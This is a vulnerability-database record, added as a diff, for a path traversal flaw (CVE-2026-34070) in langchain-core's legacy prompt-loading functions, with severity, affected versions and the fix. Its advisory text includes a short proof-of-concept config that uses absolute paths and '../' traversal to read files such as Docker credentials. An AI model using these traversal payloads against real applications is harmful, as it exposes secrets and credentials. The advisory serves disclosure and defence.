@@ -1,0 +1,363 @@
+advisory_id: GHSA-qh6h-p6c9-ff54
+datasource_id: github_osv/GHSA-qh6h-p6c9-ff54
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-qh6h-p6c9-ff54/GHSA-qh6h-p6c9-ff54.json
+aliases:
+  - CVE-2026-34070
+summary: "LangChain Core has Path Traversal vulnerabilites in legacy `load_prompt` functions\n\
+  ## Summary\n\nMultiple functions in `langchain_core.prompts.loading` read files from paths\
+  \ embedded in deserialized config dicts without validating against directory traversal or\
+  \ absolute path injection. When an application passes user-influenced prompt configurations\
+  \ to `load_prompt()` or `load_prompt_from_config()`, an attacker can read arbitrary files\
+  \ on the host filesystem, constrained only by file-extension checks (`.txt` for templates,\
+  \ `.json`/`.yaml` for examples).\n\n**Note:** The affected functions (`load_prompt`, `load_prompt_from_config`,\
+  \ and the `.save()` method on prompt classes) are undocumented legacy APIs. They are superseded\
+  \ by the `dumpd`/`dumps`/`load`/`loads` serialization APIs in `langchain_core.load`, which\
+  \ do not perform filesystem reads and use an allowlist-based security model. As part of this\
+  \ fix, the legacy APIs have been formally deprecated and will be removed in 2.0.0.\n\n## Affected\
+  \ component\n\n**Package:** `langchain-core`\n**File:** `langchain_core/prompts/loading.py`\n\
+  **Affected functions:** `_load_template()`, `_load_examples()`, `_load_few_shot_prompt()`\n\
+  \n## Severity\n\n**High** \n\nThe score reflects the file-extension constraints that limit\
+  \ which files can be read.\n\n## Vulnerable code paths\n\n| Config key | Loaded by | Readable\
+  \ extensions |\n|---|---|---|\n| `template_path`, `suffix_path`, `prefix_path` | `_load_template()`\
+  \ | `.txt` |\n| `examples` (when string) | `_load_examples()` | `.json`, `.yaml`, `.yml` |\n\
+  | `example_prompt_path` | `_load_few_shot_prompt()` | `.json`, `.yaml`, `.yml` |\n\nNone of\
+  \ these code paths validated the supplied path against absolute path injection or `..` traversal\
+  \ sequences before reading from disk.\n\n## Impact\n\nAn attacker who controls or influences\
+  \ the prompt configuration dict can read files outside the intended directory:\n\n- **`.txt`\
+  \ files:** cloud-mounted secrets (`/mnt/secrets/api_key.txt`), `requirements.txt`, internal\
+  \ system prompts\n- **`.json`/`.yaml` files:** cloud credentials (`~/.docker/config.json`,\
+  \ `~/.azure/accessTokens.json`), Kubernetes manifests, CI/CD configs, application settings\n\
+  \nThis is exploitable in applications that accept prompt configs from untrusted sources, including\
+  \ low-code AI builders and API wrappers that expose `load_prompt_from_config()`.\n\n## Proof\
+  \ of concept\n\n```python\nfrom langchain_core.prompts.loading import load_prompt_from_config\n\
+  \n# Reads /tmp/secret.txt via absolute path injection\nconfig = {\n    \"_type\": \"prompt\"\
+  ,\n    \"template_path\": \"/tmp/secret.txt\",\n    \"input_variables\": [],\n}\nprompt =\
+  \ load_prompt_from_config(config)\nprint(prompt.template)  # file contents disclosed\n\n#\
+  \ Reads ../../etc/secret.txt via directory traversal\nconfig = {\n    \"_type\": \"prompt\"\
+  ,\n    \"template_path\": \"../../etc/secret.txt\",\n    \"input_variables\": [],\n}\nprompt\
+  \ = load_prompt_from_config(config)\n\n# Reads arbitrary .json via few-shot examples\nconfig\
+  \ = {\n    \"_type\": \"few_shot\",\n    \"examples\": \"../../../../.docker/config.json\"\
+  ,\n    \"example_prompt\": {\n        \"_type\": \"prompt\",\n        \"input_variables\"\
+  : [\"input\", \"output\"],\n        \"template\": \"{input}: {output}\",\n    },\n    \"prefix\"\
+  : \"\",\n    \"suffix\": \"{query}\",\n    \"input_variables\": [\"query\"],\n}\nprompt =\
+  \ load_prompt_from_config(config)\n```\n\n## Mitigation\n\n**Update `langchain-core` to >=\
+  \ 1.2.22.**\n\nThe fix adds path validation that rejects absolute paths and `..` traversal\
+  \ sequences by default. An `allow_dangerous_paths=True` keyword argument is available on `load_prompt()`\
+  \ and `load_prompt_from_config()` for trusted inputs.\n\nAs described above, these legacy\
+  \ APIs have been formally deprecated. Users should migrate to `dumpd`/`dumps`/`load`/`loads`\
+  \ from `langchain_core.load`.\n\n## Credit\n\n- [jiayuqi7813](https://github.com/jiayuqi7813)\
+  \ reporter\n- [VladimirEliTokarev](https://github.com/VladimirEliTokarev) reporter\n- [Rickidevs](https://github.com/Rickidevs)\
+  \ reporter\n- Kenneth Cox (cczine@gmail.com) reporter"
+impacted_packages:
+  - purl: pkg:pypi/langchain-core
+    affected_versions: vers:pypi/<1.2.22
+    fixed_versions: vers:pypi/1.2.22
+    affected_packages:
+      - pkg:pypi/langchain-core@0.0.1
+      - pkg:pypi/langchain-core@0.0.2
+      - pkg:pypi/langchain-core@0.0.3
+      - pkg:pypi/langchain-core@0.0.4
+      - pkg:pypi/langchain-core@0.0.5
+      - pkg:pypi/langchain-core@0.0.6
+      - pkg:pypi/langchain-core@0.0.7
+      - pkg:pypi/langchain-core@0.0.8
+      - pkg:pypi/langchain-core@0.0.9
+      - pkg:pypi/langchain-core@0.0.10
+      - pkg:pypi/langchain-core@0.0.11
+      - pkg:pypi/langchain-core@0.0.12
+      - pkg:pypi/langchain-core@0.0.13rc1
+      - pkg:pypi/langchain-core@0.0.13rc2
+      - pkg:pypi/langchain-core@0.0.13
+      - pkg:pypi/langchain-core@0.1.0
+      - pkg:pypi/langchain-core@0.1.1
+      - pkg:pypi/langchain-core@0.1.2
+      - pkg:pypi/langchain-core@0.1.3
+      - pkg:pypi/langchain-core@0.1.4
+      - pkg:pypi/langchain-core@0.1.5
+      - pkg:pypi/langchain-core@0.1.6
+      - pkg:pypi/langchain-core@0.1.7
+      - pkg:pypi/langchain-core@0.1.8
+      - pkg:pypi/langchain-core@0.1.9
+      - pkg:pypi/langchain-core@0.1.10
+      - pkg:pypi/langchain-core@0.1.11
+      - pkg:pypi/langchain-core@0.1.12rc1
+      - pkg:pypi/langchain-core@0.1.12
+      - pkg:pypi/langchain-core@0.1.13
+      - pkg:pypi/langchain-core@0.1.14
+      - pkg:pypi/langchain-core@0.1.15rc1
+      - pkg:pypi/langchain-core@0.1.15rc2
+      - pkg:pypi/langchain-core@0.1.15
+      - pkg:pypi/langchain-core@0.1.16
+      - pkg:pypi/langchain-core@0.1.17
+      - pkg:pypi/langchain-core@0.1.18
+      - pkg:pypi/langchain-core@0.1.19
+      - pkg:pypi/langchain-core@0.1.20
+      - pkg:pypi/langchain-core@0.1.21
+      - pkg:pypi/langchain-core@0.1.22
+      - pkg:pypi/langchain-core@0.1.23
+      - pkg:pypi/langchain-core@0.1.24
+      - pkg:pypi/langchain-core@0.1.25
+      - pkg:pypi/langchain-core@0.1.26
+      - pkg:pypi/langchain-core@0.1.27
+      - pkg:pypi/langchain-core@0.1.28
+      - pkg:pypi/langchain-core@0.1.29
+      - pkg:pypi/langchain-core@0.1.30
+      - pkg:pypi/langchain-core@0.1.31
+      - pkg:pypi/langchain-core@0.1.32
+      - pkg:pypi/langchain-core@0.1.33rc1
+      - pkg:pypi/langchain-core@0.1.33
+      - pkg:pypi/langchain-core@0.1.34
+      - pkg:pypi/langchain-core@0.1.35
+      - pkg:pypi/langchain-core@0.1.36
+      - pkg:pypi/langchain-core@0.1.37
+      - pkg:pypi/langchain-core@0.1.38
+      - pkg:pypi/langchain-core@0.1.39
+      - pkg:pypi/langchain-core@0.1.40
+      - pkg:pypi/langchain-core@0.1.41
+      - pkg:pypi/langchain-core@0.1.42rc1
+      - pkg:pypi/langchain-core@0.1.42
+      - pkg:pypi/langchain-core@0.1.43
+      - pkg:pypi/langchain-core@0.1.44
+      - pkg:pypi/langchain-core@0.1.45
+      - pkg:pypi/langchain-core@0.1.46
+      - pkg:pypi/langchain-core@0.1.47rc1
+      - pkg:pypi/langchain-core@0.1.47
+      - pkg:pypi/langchain-core@0.1.48
+      - pkg:pypi/langchain-core@0.1.49
+      - pkg:pypi/langchain-core@0.1.50
+      - pkg:pypi/langchain-core@0.1.51
+      - pkg:pypi/langchain-core@0.1.52
+      - pkg:pypi/langchain-core@0.1.53
+      - pkg:pypi/langchain-core@0.2.0rc1
+      - pkg:pypi/langchain-core@0.2.0
+      - pkg:pypi/langchain-core@0.2.1
+      - pkg:pypi/langchain-core@0.2.2rc1
+      - pkg:pypi/langchain-core@0.2.2
+      - pkg:pypi/langchain-core@0.2.3
+      - pkg:pypi/langchain-core@0.2.4
+      - pkg:pypi/langchain-core@0.2.5
+      - pkg:pypi/langchain-core@0.2.6
+      - pkg:pypi/langchain-core@0.2.7
+      - pkg:pypi/langchain-core@0.2.8
+      - pkg:pypi/langchain-core@0.2.9
+      - pkg:pypi/langchain-core@0.2.10
+      - pkg:pypi/langchain-core@0.2.11
+      - pkg:pypi/langchain-core@0.2.12
+      - pkg:pypi/langchain-core@0.2.13
+      - pkg:pypi/langchain-core@0.2.15
+      - pkg:pypi/langchain-core@0.2.16
+      - pkg:pypi/langchain-core@0.2.17
+      - pkg:pypi/langchain-core@0.2.18
+      - pkg:pypi/langchain-core@0.2.19
+      - pkg:pypi/langchain-core@0.2.20
+      - pkg:pypi/langchain-core@0.2.21
+      - pkg:pypi/langchain-core@0.2.22
+      - pkg:pypi/langchain-core@0.2.23
+      - pkg:pypi/langchain-core@0.2.24
+      - pkg:pypi/langchain-core@0.2.25
+      - pkg:pypi/langchain-core@0.2.26
+      - pkg:pypi/langchain-core@0.2.27
+      - pkg:pypi/langchain-core@0.2.28
+      - pkg:pypi/langchain-core@0.2.29rc1
+      - pkg:pypi/langchain-core@0.2.29
+      - pkg:pypi/langchain-core@0.2.30
+      - pkg:pypi/langchain-core@0.2.31
+      - pkg:pypi/langchain-core@0.2.32
+      - pkg:pypi/langchain-core@0.2.33
+      - pkg:pypi/langchain-core@0.2.34
+      - pkg:pypi/langchain-core@0.2.35
+      - pkg:pypi/langchain-core@0.2.36
+      - pkg:pypi/langchain-core@0.2.37
+      - pkg:pypi/langchain-core@0.2.38
+      - pkg:pypi/langchain-core@0.2.39
+      - pkg:pypi/langchain-core@0.2.40
+      - pkg:pypi/langchain-core@0.2.41
+      - pkg:pypi/langchain-core@0.2.42
+      - pkg:pypi/langchain-core@0.2.43
+      - pkg:pypi/langchain-core@0.3.0.dev0
+      - pkg:pypi/langchain-core@0.3.0.dev1
+      - pkg:pypi/langchain-core@0.3.0.dev2
+      - pkg:pypi/langchain-core@0.3.0.dev3
+      - pkg:pypi/langchain-core@0.3.0.dev4
+      - pkg:pypi/langchain-core@0.3.0.dev5
+      - pkg:pypi/langchain-core@0.3.0
+      - pkg:pypi/langchain-core@0.3.1
+      - pkg:pypi/langchain-core@0.3.2
+      - pkg:pypi/langchain-core@0.3.3
+      - pkg:pypi/langchain-core@0.3.4
+      - pkg:pypi/langchain-core@0.3.5
+      - pkg:pypi/langchain-core@0.3.6
+      - pkg:pypi/langchain-core@0.3.7
+      - pkg:pypi/langchain-core@0.3.8
+      - pkg:pypi/langchain-core@0.3.9
+      - pkg:pypi/langchain-core@0.3.10
+      - pkg:pypi/langchain-core@0.3.11
+      - pkg:pypi/langchain-core@0.3.12
+      - pkg:pypi/langchain-core@0.3.13
+      - pkg:pypi/langchain-core@0.3.14
+      - pkg:pypi/langchain-core@0.3.15
+      - pkg:pypi/langchain-core@0.3.16
+      - pkg:pypi/langchain-core@0.3.17
+      - pkg:pypi/langchain-core@0.3.18
+      - pkg:pypi/langchain-core@0.3.19
+      - pkg:pypi/langchain-core@0.3.20
+      - pkg:pypi/langchain-core@0.3.21
+      - pkg:pypi/langchain-core@0.3.22
+      - pkg:pypi/langchain-core@0.3.23
+      - pkg:pypi/langchain-core@0.3.24
+      - pkg:pypi/langchain-core@0.3.25
+      - pkg:pypi/langchain-core@0.3.26
+      - pkg:pypi/langchain-core@0.3.27
+      - pkg:pypi/langchain-core@0.3.28
+      - pkg:pypi/langchain-core@0.3.29
+      - pkg:pypi/langchain-core@0.3.30
+      - pkg:pypi/langchain-core@0.3.31
+      - pkg:pypi/langchain-core@0.3.32
+      - pkg:pypi/langchain-core@0.3.33
+      - pkg:pypi/langchain-core@0.3.34rc1
+      - pkg:pypi/langchain-core@0.3.34rc2
+      - pkg:pypi/langchain-core@0.3.34
+      - pkg:pypi/langchain-core@0.3.35
+      - pkg:pypi/langchain-core@0.3.36
+      - pkg:pypi/langchain-core@0.3.37
+      - pkg:pypi/langchain-core@0.3.38
+      - pkg:pypi/langchain-core@0.3.39
+      - pkg:pypi/langchain-core@0.3.40
+      - pkg:pypi/langchain-core@0.3.41
+      - pkg:pypi/langchain-core@0.3.42
+      - pkg:pypi/langchain-core@0.3.43
+      - pkg:pypi/langchain-core@0.3.44
+      - pkg:pypi/langchain-core@0.3.45rc1
+      - pkg:pypi/langchain-core@0.3.45
+      - pkg:pypi/langchain-core@0.3.46
+      - pkg:pypi/langchain-core@0.3.47
+      - pkg:pypi/langchain-core@0.3.48
+      - pkg:pypi/langchain-core@0.3.49
+      - pkg:pypi/langchain-core@0.3.50
+      - pkg:pypi/langchain-core@0.3.51
+      - pkg:pypi/langchain-core@0.3.52
+      - pkg:pypi/langchain-core@0.3.53
+      - pkg:pypi/langchain-core@0.3.54
+      - pkg:pypi/langchain-core@0.3.55
+      - pkg:pypi/langchain-core@0.3.56rc1
+      - pkg:pypi/langchain-core@0.3.56
+      - pkg:pypi/langchain-core@0.3.57
+      - pkg:pypi/langchain-core@0.3.58
+      - pkg:pypi/langchain-core@0.3.59
+      - pkg:pypi/langchain-core@0.3.60
+      - pkg:pypi/langchain-core@0.3.61
+      - pkg:pypi/langchain-core@0.3.62
+      - pkg:pypi/langchain-core@0.3.63
+      - pkg:pypi/langchain-core@0.3.64
+      - pkg:pypi/langchain-core@0.3.65
+      - pkg:pypi/langchain-core@0.3.66
+      - pkg:pypi/langchain-core@0.3.67
+      - pkg:pypi/langchain-core@0.3.68
+      - pkg:pypi/langchain-core@0.3.69
+      - pkg:pypi/langchain-core@0.3.70
+      - pkg:pypi/langchain-core@0.3.71
+      - pkg:pypi/langchain-core@0.3.72
+      - pkg:pypi/langchain-core@0.3.73
+      - pkg:pypi/langchain-core@0.3.74
+      - pkg:pypi/langchain-core@0.3.75
+      - pkg:pypi/langchain-core@0.3.76
+      - pkg:pypi/langchain-core@0.3.77
+      - pkg:pypi/langchain-core@0.3.78
+      - pkg:pypi/langchain-core@0.3.79
+      - pkg:pypi/langchain-core@0.3.80
+      - pkg:pypi/langchain-core@0.3.81
+      - pkg:pypi/langchain-core@0.3.82
+      - pkg:pypi/langchain-core@0.3.83
+      - pkg:pypi/langchain-core@0.3.84
+      - pkg:pypi/langchain-core@0.3.85
+      - pkg:pypi/langchain-core@0.3.86
+      - pkg:pypi/langchain-core@0.4.0.dev0
+      - pkg:pypi/langchain-core@1.0.0a1
+      - pkg:pypi/langchain-core@1.0.0a2
+      - pkg:pypi/langchain-core@1.0.0a3
+      - pkg:pypi/langchain-core@1.0.0a4
+      - pkg:pypi/langchain-core@1.0.0a5
+      - pkg:pypi/langchain-core@1.0.0a6
+      - pkg:pypi/langchain-core@1.0.0a7
+      - pkg:pypi/langchain-core@1.0.0a8
+      - pkg:pypi/langchain-core@1.0.0rc1
+      - pkg:pypi/langchain-core@1.0.0rc2
+      - pkg:pypi/langchain-core@1.0.0rc3
+      - pkg:pypi/langchain-core@1.0.0
+      - pkg:pypi/langchain-core@1.0.1
+      - pkg:pypi/langchain-core@1.0.2
+      - pkg:pypi/langchain-core@1.0.3
+      - pkg:pypi/langchain-core@1.0.4
+      - pkg:pypi/langchain-core@1.0.5
+      - pkg:pypi/langchain-core@1.0.6
+      - pkg:pypi/langchain-core@1.0.7
+      - pkg:pypi/langchain-core@1.1.0
+      - pkg:pypi/langchain-core@1.1.1
+      - pkg:pypi/langchain-core@1.1.2
+      - pkg:pypi/langchain-core@1.1.3
+      - pkg:pypi/langchain-core@1.2.0
+      - pkg:pypi/langchain-core@1.2.1
+      - pkg:pypi/langchain-core@1.2.2
+      - pkg:pypi/langchain-core@1.2.3
+      - pkg:pypi/langchain-core@1.2.4
+      - pkg:pypi/langchain-core@1.2.5
+      - pkg:pypi/langchain-core@1.2.6
+      - pkg:pypi/langchain-core@1.2.7
+      - pkg:pypi/langchain-core@1.2.8
+      - pkg:pypi/langchain-core@1.2.9
+      - pkg:pypi/langchain-core@1.2.10
+      - pkg:pypi/langchain-core@1.2.11
+      - pkg:pypi/langchain-core@1.2.12
+      - pkg:pypi/langchain-core@1.2.13
+      - pkg:pypi/langchain-core@1.2.14
+      - pkg:pypi/langchain-core@1.2.15
+      - pkg:pypi/langchain-core@1.2.16
+      - pkg:pypi/langchain-core@1.2.17
+      - pkg:pypi/langchain-core@1.2.18
+      - pkg:pypi/langchain-core@1.2.19
+      - pkg:pypi/langchain-core@1.2.20
+      - pkg:pypi/langchain-core@1.2.21
+    fixed_packages:
+      - pkg:pypi/langchain-core@1.2.22
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/langchain-ai/langchain
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/langchain-ai/langchain
+        commit: 27add913474e01e33bededf4096151130ba0d47c
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-qh6h-p6c9-ff54/GHSA-qh6h-p6c9-ff54.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/langchain-ai/langchain
+    reference_type:
+    reference_id:
+  - url: https://github.com/langchain-ai/langchain/commit/27add913474e01e33bededf4096151130ba0d47c
+    reference_type:
+    reference_id:
+  - url: https://github.com/langchain-ai/langchain/releases/tag/langchain-core==1.2.22
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-34070
+    reference_type:
+    reference_id: CVE-2026-34070
+  - url: https://github.com/langchain-ai/langchain/security/advisories/GHSA-qh6h-p6c9-ff54
+    reference_type:
+    reference_id: GHSA-qh6h-p6c9-ff54
+exploits: []
